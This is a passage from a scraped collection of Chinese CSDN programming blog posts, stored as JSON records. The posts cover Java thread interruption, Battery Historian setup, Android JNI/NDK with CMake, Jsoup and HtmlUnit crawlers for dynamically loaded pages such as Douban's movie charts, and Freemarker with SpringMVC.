}\n\nsleep方法会抛出InterruptedException,sleep方法是一个可中断的方法,上面这个例子thread线程处于sleep状态时,mian线程调用interrupt方法中断了正在睡眠的线程.在catch中务必进行资源的清理工作,thread.interrupt()方法不能中断正在等待锁或者正在等待I/O的线程.如果想要关闭I/O等待的资源可以直接关闭底层资源来终止线程,而对于锁等待的线程终止在下面会有案例.在这个例子中尤其要注意一点,InterruptedException异常被捕获之后,中断状态会被重设为false\n\n\n\n例二\n\nJava中断机制是一种协作机制，也就是说通过中断并不能直接终止另一个线程，而需要被中断的线程自己处理中断。在下面这个例子中,我们检查Thread类的标志变量的方法来中断线程\n\n\n\nclass Compute implements Runnable {\n\n    @Override\n    public void run() {\n        double d = 1.0;\n\n        while (!Thread.interrupted()) {\n\n            d = d + (Math.PI + Math.E) / d;\n\n        }\n    }\n}\n\npublic class NonInterrupTest {\n    public static void main(String[] args) throws InterruptedException {\n        Thread thread = new Thread(new Compute());\n        thread.start();\n        TimeUnit.SECONDS.sleep(2);\n        thread.interrupt();\n        System.out.println(\"interrupt...\");\n    }\n}\n\n再强调下上文提到的一点Thread.interrupted()方法在调用之后Thread的标志变量会被复位\n\n\n\nReentrantLock\n\n上文提到对于正在进行锁等待的线程,我们无法通过Thread.interrupt方法立即中断线程，那么有没有一种锁可以在被interrupt时中断锁等待呢?实际上我们可以通过lockInterruptibly方法实现\n\n\n\n\nclass BlockMutex {\n    private Lock lock = new ReentrantLock();\n\n    public BlockMutex() {\n        lock.lock();\n    }\n\n    public void f() {\n        try {\n            lock.lockInterruptibly();\n            System.out.println(\"lock acquire in f() \");\n        } catch (InterruptedException e) {\n            //资源清理\n            e.printStackTrace();\n        }\n    }\n\n}\n\nclass MyBlockThread implements Runnable {\n\n    private BlockMutex blockMutex;\n\n    public MyBlockThread(BlockMutex blockMutex) {\n        this.blockMutex = blockMutex;\n    }\n\n    @Override\n    public void run() {\n        System.out.println(\"waiting lock in f()\");\n        blockMutex.f();\n        System.out.println(\"broken out of blocked call\");\n    }\n}\n\npublic class MyLockInterruptTest {\n    public static void main(String[] args) throws InterruptedException {\n        //线程创建BlockThread同时就持有了blockMutex锁\n        BlockMutex blockMutex = new BlockMutex();\n        Thread thread = new Thread(new MyBlockThread(blockMutex));\n        thread.start();\n        TimeUnit.SECONDS.sleep(1);\n        //中断锁等待\n        thread.interrupt();\n    }\n}\n\n主线程在创建BlockMutex时就持有对象锁,另一线程在等待获取BlockMutex对象锁时是就中断该线程", "time": "2018_08_14_11_12_35", "link": "https://blog.csdn.net/JavaMoo/article/details/77017927", "title": "java线程中断机制"}
{"timestamp": "2018_08_14_11_12_35", "desc": "说干就干！\n\n\n  所有操作均在 Windows 7 64位 操作系统上进行 ！\n\n\n一、概念\n\n\n  Battery Historian：https://github.com/google/battery-historian\n  \n  Battery Historian 是一个这样的的工具：可以在 Android 5.0 Lollipop（API 级别21）及更高版本的 Android 设备上检测与电池相关的信息和事件，而在此期间，该设备没有插上电源。它允许应用程序开发人员在时间轴上可视化系统和应用级别的事件，并使用平移和缩放功能，在设备最后一次完全充电之后，可以轻松地查看各种聚合统计信息，可以选择一个应用程序，检查所选择的应用程序对电池指标的影响。此外，它还允许对两个错误报告进行 A/B 比较，突出显示了关键电池相关指标的差异。\n\n\n\n\n二、配置方法\n\nBattery Historian 的运行需要很多环境的支持，要做很多配置，官网介绍了两个方法，一种是通过 Docker_百度百科 使用官网提供的已配置好的容器，另外一种就是老老实实自己配各种环境，第一种的Using Docker 看似较为简单，但有很多坑 …\n\n\n\n1、Using Docker（通过 Docker 来间接使用 Battery Historian）\n\n\n  Docker：https://docs.docker.com/engine/installation/\n\n\n你会惊奇地发现，Docker 只支持 Mac 和 Windows 10 ，哈哈，让你不用 Mac 开发：\n\n\n\n这时又会发现，通过曲线救国 Windows 7 也是可以安装的：\n\nhttp://blog.csdn.net/qq2712193/article/details/54576313 \nhttp://blog.csdn.net/chenliguan/article/details/53454590\n\n当但会有很多很多不同的坑等着你，搞了一晚上之后，我决定放弃了 …\n\n\n\n2、Building from source code（通过各种配置后从源码构建）\n\n官方流程看似很麻烦，但一上手，很快就搞定，让我情何以堪。\n\n\n  ps：以下均是参考官方及网友做的 copy \n  https://github.com/google/battery-historian#building-from-source-code \n  http://blog.csdn.net/feitian_666/article/details/52756522 \n  http://blog.csdn.net/feitian_666/article/details/52756522\n\n\n（1）安装 Go 语言\n\n\n下载：https://golang.org/doc/install\n安装\n配置环境变量\n\n\n\n\n\n\n\n\n\n检查是否安装成功：cmd 执行 “go version”\n\n\n\n\n（2）安装 Python\n\n\n下载：https://www.python.org/ 【注意仅支持 python 2.7，python3.0改变很大】\n安装\n配置环境变量 \n\n检查是否安装成功：cmd 执行 “python –V”【注意是大写V】\n\n\n\n\n（3）安装Git\n\n\n下载：https://git-scm.com/\n安装\n检查是否安装成功：cmd 执行 “git version”\n\n\n\n\n（4）安装 Java 环境\n\n\n别跟我说你没有 …\n\n\n（5）下载 Battery Historian 源码并且运行\n\n\ncmd 执行“go get -d -u github.com/google/battery-historian/…”【注意最后有三个点】\n\n\n\n\n\n进入到“$GOPATH/src/github.com/google/battery-historian”目录下方【GOPATH即上面配置的工作空间】\n\n\n\n  ps：我直接“cd $GOPATH/src/github.com/google/battery-historian”不行，耍了点小技巧，直接到指定目录下运行 cmd，又因为指定目录下有名为“cmd”的文件夹，只能分两步走： \n  \n  \n  最后发现，先在所在盘符启动cmd（我是D盘），然后直接 cd 路径就行：\n  \n  \n\n\n\n运行 Battery Historian\n\ncmd 执行“go run setup.go”【第一次执行要下载，时间会久一些，以后就快些】\n\n\ncmd 执行“go run cmd/battery-historian/battery-historian.go”\n\n\n\n\n\n  ps：http://blog.csdn.net/feitian_666/article/details/52756522 提供了一个在没有下载成功情况下补充“go run setup.go”的方法：手动下载【closure-library】和【closure-compiler】和【flot-axislabels】，解压放到 GOROOT 目录下 third_party 文件夹下方的的 closure-compiler、closure-library 和flot-axislabels 文件夹，如果没有均手动创建。\n\n\n\n\n\n登录网址 http://localhost:9999 查看是否运行\n\n\n\n\n\n\n二、使用\n\n\n\n1、运行 Battery Historian\n\n在上面 Building from source code 均配置成功的情况下：\n\n\n进入到“$GOPATH/src/github.com/google/battery-historian”目录下方\ncmd 执行“go run setup.go”\ncmd 执行“go run cmd/battery-historian/battery-historian.go”\n\n\n\n\n\n\n2、导出手机的 Bugreport 文件：cmd执行“adb bugreport > bugreport.txt”\n\n\n  ps：这时如果有两个设备在线上，就会报错，应该可以指定某个设备生成的，懒一点，拔掉其它。只留下一个，ByTheWay，生成的待分析文件会有点大\n\n\n\n\n\n\n3、上传 bugreport.txt 文件至 http://localhost:9999\n\n\n\n\n\n\n\n\n\n参考文章： \nhttps://github.com/google/battery-historian \nhttp://blog.csdn.net/feitian_666/article/details/52756522 \nhttp://blog.csdn.net/feitian_666/article/details/52756522", "time": "2018_08_14_11_12_35", "link": "https://blog.csdn.net/zeqiao/article/details/77504477", "title": "电量分析工具 Battery Historian 的配置及使用"}
{"timestamp": "2018_08_14_11_12_36", "desc": "说干就干！\n\nJNI：Java Native Interface（Java 本地编程接口），一套编程规范，它提供了若干的 API 实现了 Java 和其他语言的通信（主要是 C/C++）。Java 可以通过 JNI 调用本地的 C/C++ 代码，本地的 C/C++ 代码也可以调用 java 代码。Java 通过 C/C++ 使用本地的代码的一个关键性原因在于 C/C++ 代码的高效性。\n\nNDK：Native Development Kit（本地开发工具），一系列工具的集合，提供了一系列的工具，帮助开发者快速开发 C/C++，极大地减轻了开发人员的打包工作。\n\n一、安装所需工具\n\n\n\n\nNDK：这套工具集允许为 Android 使用 C 和 C++ 代码。\nCMake：一款外部构建工具，可与 Gradle 搭配使用来构建原生库。如果只计划使用 ndk-build，则不需要此组件。\nLLDB：一种调试程序，Android Studio 使用它来调试原生代码。\n\n\n\n  Ps：CMake 是 AS 2.2 之后加入的一个跨平台的安装（编译）工具，可以用简单的语句来描述所有平台的安装(编译过程)，简单来说就是简化 JNI 开发的编译步骤，不用像以前那样要各种手动生成（http://www.jianshu.com/p/e7c2c63fa70e）\n\n\n\n\n二、创建支持 C/C++ 的新项目\n\n\n\n1、新建支持 C/C++ 的新项目\n\n只要在新建项目时勾上这里就行：\n\n\n\n在向导的 Customize C++ Support 部分，有下列自定义项目可供选择：\n\n\n  \n  C++ Standard：使用下拉列表选择使用哪种 C++ 标准。选择 Toolchain Default 会使用默认的 CMake 设置。\n  Exceptions Support：如果希望启用对 C++ 异常处理的支持，请选中此复选框。如果启用此复选框，Android Studio 会将 -fexceptions 标志添加到模块级 build.gradle文件的 cppFlags中，Gradle 会将其传递到 CMake。\n  Runtime Type Information Support：如果希望支持 RTTI，请选中此复选框。如果启用此复选框，Android Studio 会将 -frtti 标志添加到模块级 build.gradle文件的 cppFlags中，Gradle 会将其传递到 CMake。\n  \n\n\n\n\n\n\n2、主要项目结构\n\n对于开发者来说，主要关注这两个地方：\n\n\n\n\ncpp 文件夹：用于编写 C/C++代码\nCMakeLists.txt：CMake 脚本配置文件\n\n\n\n\n3、编写代码安装运行\n\n新建支持 C/C++ 的新项目时有默认的实例代码：\n\n\n\npublic class MainActivity extends AppCompatActivity {\n\n    // Used to load the 'native-lib' library on application startup.\n    // 加载本地库\n    static {\n        System.loadLibrary(\"native-lib\");\n    }\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Example of a call to a native method\n        TextView tv = (TextView) findViewById(R.id.sample_text);\n        tv.setText(stringFromJNI());\n    }\n\n    /**\n     * A native method that is implemented by the 'native-lib' native library,\n     * which is packaged with this application.\n     */\n    // 本地方法\n    public native String stringFromJNI();\n}\n\n\n\n#include <jni.h>\n#include <string>\n\nextern \"C\"\nJNIEXPORT jstring\n\nJNICALL\nJava_com_xq_jnidemo01_MainActivity_stringFromJNI(JNIEnv *env,jobject /* this */) {\n    std::string hello = \"Hello from C++\";\n    return env->NewStringUTF(hello.c_str());\n}\n\n\n\n\n\n\n三、在原有旧项目中引入\n\n\n\n1、新建 C/C++ 源码文件夹和文件\n\n\n\n\n\n2、编写 CMakeLists.txt 文件\n\n\n\n\n  Ps：如果嫌编写 CMakeLists.txt 文件麻烦，就直接新建一个支持 C/C++ 的新项目，拷贝修改即可（拷贝之后可以删去文件中的注释，便于阅读）\n\n\n\n\n\n\n# TODO 设置构建本机库文件所需的 CMake的最小版本\ncmake_minimum_required(VERSION 3.4.1)\n\n# TODO 添加自己写的 C/C++源文件\nadd_library( demo-lib\n             SHARED\n             src/main/cpp/demo-lib.cpp )\n\n# TODO 依赖 NDK中的库\nfind_library( log-lib\n              log )\n\n# TODO 将目标库与 NDK中的库进行连接\ntarget_link_libraries( demo-lib\n                       ${log-lib} )\n\n\n\n3、配置 build.gradle 文件\n\n\n\n\n\nandroid {\n    ...\n    defaultConfig {\n        ...\n        externalNativeBuild {\n            cmake {\n                // 默认是 “ cppFlags \"\" ”\n                // 如果要修改 Customize C++ Support 部分，可在这里加入\n                cppFlags \"-frtti -fexceptions\"\n            }\n        }\n    }\n    buildTypes {\n        ...\n    }\n    externalNativeBuild {\n        cmake {\n            path \"CMakeLists.txt\"\n        }\n    }\n}\n\ndependencies {\n    ...\n}\n\n最后是编写代码安装运行 …\n\n\n\n四、几个要注意的点\n\n\n\n1、要在哪个类运用 JNI ，就得加载相应的动态库\n\n\n\n// 加载动态库\n    static {\n        System.loadLibrary(\"demo-lib\");\n    }\n\n\n\n2、快速生成代码：Alt + Enter\n\n\n\n\n\n3、新建 C/C++ 源代码文件，要添加到 CMakeLists.txt 文件中\n\n\n\n\n\n\n\n4、引入第三方 .so文件，要添加到 CMakeLists.txt 文件中\n\n（1）新建资源文件夹 jniLibs（貌似在 libs中也行，只要在 CMakeLists.txt中添加路径指示）\n\n\n\n（2）在 CMakeLists.txt中添加路径指示\n\n\n\n\n  Ps：这里要注意两个地方\n  \n  ①  在定义库的名字时，不要加前缀 lib 和后缀 .so，不然会报错：java.lang.UnsatisfiedLinkError: Couldn’t load xxx : findLibrary【findLibrary returned null错误： http://blog.csdn.net/treasure3334/article/details/17170927】 \n  ②  ABI 文件夹上面不要再分层，直接用“jniLibs/${ANDROID_ABI}/”的格式，不然也会报错\n\n\n\n\n# TODO 添加第三方库\n# TODO add_library(libavcodec-57\n# TODO 原先生成的.so文件在编译后会自动添加上前缀lib和后缀.so，\n# TODO       在定义库的名字时，不要加前缀lib和后缀 .so，\n# TODO       不然会报错:java.lang.UnsatisfiedLinkError: Couldn't load xxx : findLibrary returned null\nadd_library(avcodec-57\n            # TODO STATIC表示静态的.a的库，SHARED表示.so的库\n            SHARED\n            IMPORTED)\nset_target_properties(avcodec-57\n                      PROPERTIES IMPORTED_LOCATION\n                      # TODO ${CMAKE_SOURCE_DIR}：表示 CMakeLists.txt的当前文件夹路径\n                      # TODO ${ANDROID_ABI}：编译时会自动根据 CPU架构去选择相应的库\n                      # TODO ABI文件夹上面不要再分层，直接就 jniLibs/${ANDROID_ABI}/\n                      # TODO ${CMAKE_SOURCE_DIR}/src/main/jniLibs/ffmpeg/${ANDROID_ABI}/libavcodec-57.so\n                      ${CMAKE_SOURCE_DIR}/src/main/jniLibs/${ANDROID_ABI}/libavcodec-57.so)\nadd_library(avdevice-57\n            SHARED\n            IMPORTED)\nset_target_properties(avdevice-57\n                      PROPERTIES IMPORTED_LOCATION\n                      ${CMAKE_SOURCE_DIR}/src/main/jniLibs/${ANDROID_ABI}/libavdevice-57.so)\n\n（3）将自己编写的 C/C++源文件与第三方库进行连接\n\n\n\n\n\n5、引入第三方 .h 文件夹，要添加到 CMakeLists.txt 文件中\n\n\n\n\n  Ps：本来想在 jniLibs 中引入，但编译会出错，所以只能在 CPP 资源文件夹中引入\n\n\n\n\n# TODO include_directories( src/main/jniLibs/${ANDROID_ABI}/include )\n# TODO 路径指向上面会编译出错，指向下面的路径就没问题\ninclude_directories( src/main/cpp/ffmpeg/include )\n\n\n\n\n\n6、CPP 资源文件夹中的同名问题\n\nCPP 资源文件夹下面的文件和文件夹不能重名，不然 System.loadLibrary() 时找不到，会报错：java.lang.UnsatisfiedLinkError: Native method not found\n\n\n\n\n\n7、undefined reference to ‘xxx’\n\n\n\n// 使C与C++能够正常混编\n// 指示编译器按照C语言进行编译\nextern \"C\"\n{\n    ...\n}\n\n\n\n\n\n8、error: ‘xxx.so’，needed by ‘xxxx.so’，missing and no known rule to make it\n\n不同厂商的 Android 手机支持的 CPU 架构不同【Android-ABIFilter：http://blog.csdn.net/qq_32452623/article/details/71076023】，一般引入的第三方 .so 文件有多个 ABI 的类型，Cmake会默认对下面 7 个ABI分别调试，但如果只引入一部分，那么要在 build.gradle 中设置 ndk 的 abiFilters 属性：\n\n\n\n externalNativeBuild {\n            cmake {\n                // 默认是 “ cppFlags \"\" ”\n                // 如果要修改 Customize C++ Support 部分，可在这里加入\n                cppFlags \"-frtti -fexceptions\"\n            }\n        }\n        ndk {\n            // abiFiliter： ABI 过滤器（application binary interface，应用二进制接口）\n            // Android 支持的 CPU 架构\n            abiFilters 'armeabi'//,'armeabi-v7a','arm64-v8a','x86','x86_64','mips','mips64'\n        }\n\n\n\n\n\n参考文章： \nhttp://www.jianshu.com/p/c1a0aed93675 \nhttp://www.jianshu.com/p/5f29fd671750 \nhttp://blog.csdn.net/cuiyufeng2/article/details/64125594", "time": "2018_08_14_11_12_36", "link": "https://blog.csdn.net/zeqiao/article/details/77893167", "title": "AndroidStudio 进行 JNI / NDK 开发：初步配置及使用"}
{"timestamp": "2018_08_14_11_12_37", "desc": "××    前几天看了一下豆瓣电影的内容，想从豆瓣电影的分类排行榜 · · · · · 中爬取多一点的电影信息。点击一个类型进去之后发现它里面的电影信息时需要你不断往下拉动滚动条之后才会动态地加载更多的电影信息并显示出来。\n\n观察了一下发现了它采用的是AJAX异步请求(通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新).这样就导致了查看到源代码内容（因为它是静态的）与网页内容不同。\n\nF12之后发现了可疑的js文件，如下： \n\n\n通过浏览器打开这个js文件发现它的里面就是从服务器端返回的电影信息的一个json对象数组。这个js文件的url是这样的： \nhttps://movie.douban.com/j/chart/top_list?type=24&interval_id=100%3A90&action=&start=20&limit=20\n\n每个这样的url除了start和limit后面的数字不一致之外其他的都相同，那么这两个数据表示的是什么呢？？？我想答案应该是从第20个电影信息开始往后读取20个电影的信息！ \n\n那么问题来了？！\n\n\n那么这个url怎么获取呢？？？\n\n1>  知道了这个url我们就不需要从网页源代码中去寻找电影的信息，每个类型的电影下面构造这样的url直接connect接收返回的json数据，分析json数据然后从json对象数组中提取电影信息。\n\n2>每个类型下面的电影总数怎么知道？知道了这种类型有多少个电影之后直接将start=0&limit=电影总数，就可以一次返回所有的电影信息的json数据。\n\n　　３> 通过观察发现了一个这样的js文件： \n　　\n\n点击这个count的url之后发现这个里面就是每个类型的电影总数， \n \n\n这里面的total就是电影总数。 \n　　 \n　　4> 这样我们就可以开始敲代码了。\n\n\n\n\n！首先进入到有各种类型的页面（也就是这样的）\n\n\n\npublic class Test {\n    private static HashMap<String,String> urlandnames = new HashMap<String, String>();\n\n    public static void main(String[] args) {\n        String url = \"http://movie.douban.com/chart\";\n        GetMoviesName getMoviesName = new GetMoviesName(url);\n        try {\n            urlandnames = getMoviesName.getAllKinds();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        Iterator it = urlandnames.keySet().iterator();    //使用iterator遍历hashmap\n        while (it.hasNext()){\n            RunnableOfMoviename runnable = new RunnableOfMoviename((String) it.next());    //它的返回值是object类型\n            Thread thread = new Thread(runnable);\n            thread.start();                         //创建多个线程并启动\n        }\n    }\n}\n\npublic class GetMoviesName {\n    private String html;\n    private String url;\n    private String kindofurl;\n    HashMap<String, String> hrefandname = new HashMap<String, String>(); //保存电影分类的url和类型\n\n    public GetMoviesName(String url) {\n        this.url = url;\n    }\n\n    public HashMap<String, String> getAllKinds() throws IOException {\n        Document kinds = Jsoup.connect(url).timeout(10000).get();\n        Element element = kinds.getElementById(\"content\");\n        Elements elements = element.getElementsByClass(\"types\");\n        for (Element t:elements){\n            Elements elem = t.getElementsByTag(\"a\");\n            for (Element a:elem){\n            //构造每种类型电影的链接\n                String kindurl = \"http://movie.douban.com\"+a.attr(\"href\");\n                hrefandname.put(kindurl,t.text());\n            }\n        }\n        return hrefandname;\n    }\n}\n\n\npublic class RunnableOfMoviename implements Runnable {\n\n    private String url = null;                //每创建一个线程就获取一种类型里面的所有电影名\n    private String nameurl = null;\n\n    public RunnableOfMoviename(String url) {\n        this.url = url;\n    }\n\n    public void run() {\n        String[] tempurl = url.split(\"&\");               //获取到每个电影类型的js文件的url,得到该类型的电影个数\n        String s1 = \"http://movie.douban.com/j/chart/top_list_count?\";\n        String finalurl = s1+tempurl[1]+\"&\"+tempurl[2];\n\n\n        String document = null;\n        try {\n            document = Jsoup.connect(finalurl).timeout(10000).ignoreContentType(true).execute().body();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        JsonParser parser = new JsonParser();      //json解析器\n        JsonObject jsonObject = (JsonObject)parser.parse(document);    //获取json对象\n        int movienum = jsonObject.get(\"total\").getAsInt();\n\n        nameurl = \"http://movie.douban.com/j/chart/top_list?\"+tempurl[1]+\"&\"+tempurl[2]+\"&action=&start=0&limit=\"+movienum;\n\n        String doc = null;\n        try {\n            doc = Jsoup.connect(nameurl).timeout(10000).ignoreContentType(true).execute().body();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        //将json的一个对象数组解析成JsonElement对象\n        JsonElement element = null;\n        try {\n            element = parser.parse(doc);  //通过JsonParser对象可以把json格式的字符串解析成一个JsonElement对象\n        }catch (NullPointerException e){\n            e.printStackTrace();\n        }\n        JsonArray jsonArray = null;\n        if (element.isJsonArray()){               //JsonElement对象如果是一个数组的话转化成jsonArray\n            jsonArray = element.getAsJsonArray();\n        }\n\n        Iterator it = jsonArray.iterator();           //遍历json的对象数组，将每一个对象里的title输出\n        while(it.hasNext()){\n            JsonObject e = (JsonObject)it.next();\n            Movies movie = new Movies();\n\n            String doubletitle = e.get(\"title\").getAsString();\n            String name = doubletitle.split(\"\\\"\")[0];              //字符串分割\n            double score = e.get(\"score\").getAsDouble();\n            String release_date = e.get(\"release_date\").getAsString();\n            JsonArray Elements = e.get(\"types\").getAsJsonArray();\n            ArrayList<String> array = new ArrayList<String>();\n            for (Object o:Elements){\n                array.add(o.toString().split(\"\\\"\")[1]);\n            }\n\n            movie.setName(name);\n            movie.setTypes(array.toString());\n            movie.setRelease_date(release_date);\n            movie.setScore(score);\n        }\n    }\n}\n\n\n这样就可以运行了", "time": "2018_08_14_11_12_37", "link": "https://blog.csdn.net/sunshine__me/article/details/50589573", "title": "定向爬虫：动态加载网页的爬取"}
{"timestamp": "2018_08_14_11_12_38", "desc": "直接上代码：\n\n一、 index.html \n调用后台请求获取content中的内容。\n\n\n\n<html>\n<head>\n    <script type=\"text/javascript\" src=\"./jquery.min.js\"></script>\n</head>\n<body>\n<h2>Hello World!</h2>\n<div id=\"content\"></div>\n<script type=\"text/javascript\">\n$(document).ready(function(){\n      $.post(\"/evh/test/testList\",{},function(data){\n          $(\"#content\").text(JSON.stringify(data));\n      }); \n});\n</script>\n</body>\n</html>\n\n二、TestController.java \n/test/testList接口从后台数据库获取数据。\n\n\n\npackage com.everhomes.proxy.controller;\n\nimport javax.annotation.Resource;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport com.everhomes.proxy.mapper.TestMapper;\n\n@RestController\n@RequestMapping(\"/test\")\npublic class TestController {\n    private static final Logger logger = LoggerFactory.getLogger(TestController.class);\n\n    @Resource\n    private TestMapper testMapper;\n\n    @RequestMapping(\"testList\")\n    public Object testList(){\n        return testMapper.testList();\n    };\n\n    @ExceptionHandler(Exception.class)\n    public Object exception(Exception e){\n        logger.error(\"error: \", e);\n        return \"error: \" + e.toString();\n    }\n}\n\n三、Crawler.java\n\npackage com.everhomes.generate;\n\nimport java.io.IOException;\n\nimport com.gargoylesoftware.htmlunit.NicelyResynchronizingAjaxController;\nimport com.gargoylesoftware.htmlunit.WebClient;\nimport com.gargoylesoftware.htmlunit.html.HtmlPage;\n\npublic class Crawler {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        WebClient webClient = new WebClient(BrowserVersion.CHROME);  \n            webClient.getOptions().setJavaScriptEnabled(true);\n            webClient.getOptions().setCssEnabled(false);\n            webClient.getOptions().setRedirectEnabled(true);\n            webClient.getOptions().setThrowExceptionOnScriptError(false);\n            webClient.getOptions().setTimeout(50000);\n            HtmlPage rootPage = webClient.getPage(\"http://localhost:8080/evh/index.html\");  \n            webClient.waitForBackgroundJavaScript(10000);\n\n            FileUtils.createFile(DIRECTORY+\"cc.html\", rootPage.asXml());\n            webClient.close();\n    }\n}\n\n\n四、pom.xml \n添加相关依赖。\n\n\n    <dependency>\n        <groupId>commons-lang</groupId>\n        <artifactId>commons-lang</artifactId>\n        <version>2.6</version>\n    </dependency>\n    <dependency> \n            <groupId>net.sourceforge.htmlunit</groupId> \n            <artifactId>htmlunit-core-js</artifactId> \n            <version>2.23</version> \n    </dependency> \n    <dependency> \n            <groupId>net.sourceforge.htmlunit</groupId> \n            <artifactId>htmlunit</artifactId> \n            <version>2.25</version> \n    </dependency>", "time": "2018_08_14_11_12_38", "link": "https://blog.csdn.net/tangtong1/article/details/60876442", "title": "htmlunit爬取js异步加载后的页面"}
{"timestamp": "2018_08_14_11_12_38", "desc": "What is Freemarker？\n\nFreeMarker是一个基于Java的模板引擎，最初专注于使用MVC软件架构生成动态网页。但是，它是一个通用的模板引擎，不依赖于servlets或HTTP或HTML，因此它通常用于生成源代码，配置文件或电子邮件。（ from wikipedia.org） \n官方网站：http://freemarker.org/\n\n\n\nHow to use Freemarker？\n\n本文中会介绍 Freemarker 在 JavaWeb 中作为视图展示的用法（类似于JSP的功能），后面有机会可以介绍一下使用这种模板引擎技术做代码生成工具或是在电子邮件功能上的使用。\n\n\n\n正文\n\n最开始我们准备好我们的第一个 Freemarker 模板 在WEB-INF 下建 templates 文件夹，然后创建 test.ftl 模板\n\n\n\n<html>  \n    <head> \n        <title>freemarker Test</title>  \n    </head>\n    <body>  \n        <h1>Hello,${name}</h1>  \n    </body>  \n</html>  \n\n接着引入依赖\n\n    <properties>\n        <spring.version>4.3.6.RELEASE</spring.version>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupId>org.freemarker</groupId>\n            <artifactId>freemarker</artifactId>\n            <version>2.3.23</version>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-core</artifactId>\n            <version>${spring.version}</version>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-context</artifactId>\n            <version>${spring.version}</version>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-context-support</artifactId>\n            <version>${spring.version}</version>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-webmvc</artifactId>\n            <version>${spring.version}</version>\n        </dependency>\n    </dependencies>\n\n配置 web.xml (添加SpringMVC过滤器 拦截所有请求，略) \n然后在 Spring 配置文件中添加 Freemarker视图解析器\n\n\n\n    <!-- FreeMarker模板路径 -->\n    <bean id=\"freemarkerConfig\"\n        class=\"org.springframework.web.servlet.view.freemarker.FreeMarkerConfigurer\">\n        <property name=\"freemarkerSettings\" ref=\"freemarkerConfiguration\" />\n        <property name=\"templateLoaderPath\">\n            <value>/WEB-INF/templates</value>\n        </property>\n        <property name=\"freemarkerVariables\">\n            <map>\n                <entry key=\"xml_escape\" value-ref=\"fmXmlEscape\" />\n            </map>\n        </property>\n        <property name=\"defaultEncoding\">\n            <value>utf-8</value>\n        </property>\n    </bean>\n    <bean id=\"fmXmlEscape\" class=\"freemarker.template.utility.XmlEscape\" />\n\n    <!-- 配置freeMarker视图解析器 -->\n    <bean\n        class=\"org.springframework.web.servlet.view.freemarker.FreeMarkerViewResolver\">\n        <property name=\"viewClass\"\n            value=\"org.springframework.web.servlet.view.freemarker.FreeMarkerView\" />\n        <property name=\"contentType\" value=\"text/html; charset=utf-8\" />\n        <property name=\"suffix\" value=\".ftl\" />\n        <property name=\"order\" value=\"0\" />\n    </bean>\n\n最后我们写一个视图控制器用来访问 test.ftl\n\n@Controller\n@RequestMapping(value=\"hello\")\npublic class FirstViewController {\n    @RequestMapping(value = \"test.html\", method = RequestMethod.GET)\n    public String index(String name,Model model) {\n        model.addAttribute(\"message\", \"hello\");\n        model.addAttribute(\"name\", name);\n        return \"/test\";\n    }\n}\n\n\n\n\n\n最后\n\n不要问我 Freemarker 和 JSP 那个更好，那个更优秀。", "time": "2018_08_14_11_12_38", "link": "https://blog.csdn.net/xiaoping0915/article/details/72814980", "title": "【Freemarker】SpringMVC使用Freemarker作为视图解析"}
{"timestamp": "2018_08_14_11_12_38", "desc": "本文由我的微信公众号（bruce常）原创首发， \n  并同步发表到csdn博客，欢迎转载，2016年12月11日。\n\n\n\n\n概述：\n\n本周五，接到一个任务，要使用爬虫技术来获取某点评网站里面关于健身场馆的数据，之前从未接触过爬虫技术，于是就从网上搜了一点学习资料，本篇文章就记录爬虫技术Jsoup技术，爬虫技术听名称很牛叉，其实没什么难点，慢慢的用心学习就会了。\n\n\n\nJsoup介绍：\n\nJsoup 是一个 Java 的开源HTML解析器，可直接解析某个URL地址、HTML文本内容，Jsoup官网jar包下载地址。\n\nJsoup主要有以下功能： \n1. 从一个URL，文件或字符串中解析HTML \n2. 使用DOM或CSS选择器来查找、取出数据 \n3. 对HTML元素、属性、文本进行操作 \n4. 清除不受信任的HTML (来防止XSS攻击)\n\n\n\n使用Jsoup爬虫技术你需要的能力有：\n\n\n我们是用安卓开发的，首先肯定要有一定的安卓开发能力，会写简单的页面。\nJsoup中用到了Javascript语言，没有此语言能力在获取数据的时候就比较吃力，这是此爬虫技术的重中之重。\n查阅文档与解决问题的能力和技巧（有点废话）\n\n\n上面三条中对于一个安卓开发者来说，最难的就是熟练使用Javascript语言，小编就遇到了这个问题，小编还有一定的javascript基础，系统的学习过此语言，但是在使用中还是很吃力的，问同学、问朋友、问同事，最后还是靠自己来获取自己想要的数据。\n\n\n\n爬虫技术没那么难，思路就是这么的简单\n\n\n得到自己想要爬取数据的url.\n通过Jsoup的jar包中的方法将Html解析成Document，\n使用Document中的一些列get、first、children等方法获取自己想要的数据，如图片地址、名称、时间。\n将得到的数据封装成自己的实体类。\n将实体中的数据在页面加载出来。\n\n\n\n\n实战，获取**点评网站中的场馆数据：\n\n\n\n先奉上效果图，没有图不说话：\n\n\n\n这就是今天要实现的效果，左边图片是场馆的logo，右边上方是场馆的名称，下边是场馆的地址信息，点击进去可以根据超链接地址跳转新的页面，页面的Url地址小编已经拿到，但可能是因为重定向的问题，webview没有加载出来，有兴趣的可以输入链接地址来验证。\n\n\n\n首先：新建一个空的项目.\n\n上面的效果，只要接触过安卓开发的都能写出来，所以不是本篇文章的重点，这里就不过多说明，大家可以使用ListView或者RecyclerView来实现，我这里用ListView。\n\n小编这里是为了加入侧边栏所以使用的是DrawerLayout，但后来没有用到，所以也就没有侧边栏的效果，不过后期如有时间会加上去的，上一页下一页是为了简单的模仿浏览器中的操作，此效果只能显示前9页数据，网页链接中有50页的数据，为什么没有实现呢？\n\n很简单，因为50页的链接地址不是一次性返回的，小编为了方便，只获取了前9页数据的url，毕竟是为了